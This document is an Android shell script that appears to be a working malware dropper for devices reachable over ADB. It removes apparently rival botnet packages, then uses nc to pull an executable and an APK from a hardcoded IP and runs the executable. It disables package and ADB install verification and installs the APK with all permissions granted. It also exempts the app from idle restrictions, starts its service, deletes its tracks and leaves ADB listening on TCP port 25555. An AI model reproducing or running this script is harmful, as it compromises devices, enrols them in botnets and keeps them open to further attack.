DIR=/data/local/tmp
IP=203.188.174.195
mkdir -p $DIR; cd $DIR


pm uninstall google.android.sys.update
pm disable-user google.android.sys.update

# snow
pm uninstall com.android.docks
pm disable-user com.android.docks

# lorikazz
pm uninstall com.oreo.mcflurry
pm disable-user com.oreo.mcflurry

(
  toybox nc $IP 3923 > payload_for_cpu ||
  busybox nc $IP 3923 > payload_for_cpu ||
  busybox1 nc $IP 3923 > payload_for_cpu
  chmod 777 payload_for_cpu
  ./payload_for_cpu payload_for_cpulam
) &

pm list packages 2>/dev/null | grep -q "^package:com.example.worker$" \
|| dumpsys package com.example.worker 2>/dev/null | grep -q "Package \[com.example.worker\]"

if [ $? -eq 0 ]; then
    echo "Package com.example.worker already installed:"

    PKG_PATH=$(pm path com.example.worker 2>/dev/null)
    [ -n "$PKG_PATH" ] && echo "$PKG_PATH"

    pm enable com.example.worker >/dev/null 2>&1
    am startservice -n com.example.worker/.MainActivity || am start-foreground-service -n com.example.worker/.MainActivity || \
    am start -n com.example.worker/.MainActivity || \
    cmd activity start -n com.example.worker/.MainActivity

    exit 0
fi

(
  toybox nc $IP 9248 > client.apk ||
  busybox nc $IP 9248 > client.apk ||
  busybox1 nc $IP 9248 > client.apk
) &

sleep 5



settings put global verifier_verify_adb_installs 0 2>/dev/null
settings put global package_verifier_enable 0 2>/dev/null


pm install -g /data/local/tmp/client.apk || \
pm install -r -g /data/local/tmp/client.apk || \
cmd package install -r -g /data/local/tmp/client.apk || \
cmd package install -g /data/local/tmp/client.apk

dumpsys deviceidle whitelist +com.example.worker


pm enable com.example.worker || \
cmd package set-app-enabled-setting com.example.worker enabled || \
am broadcast -a com.example.worker.ENABLE_APP || \
cmd package enable com.example.worker


am startservice -n com.example.worker/.MainActivity || am start-foreground-service -n com.example.worker/.MainActivity || \
am start -n com.example.worker/.MainActivity || \
cmd activity start -n com.example.worker/.MainActivity


rm -f $DIR/*

setprop service.adb.tcp.port 25555; setprop persist.adb.tcp.port 25555 > /dev/null 2>&1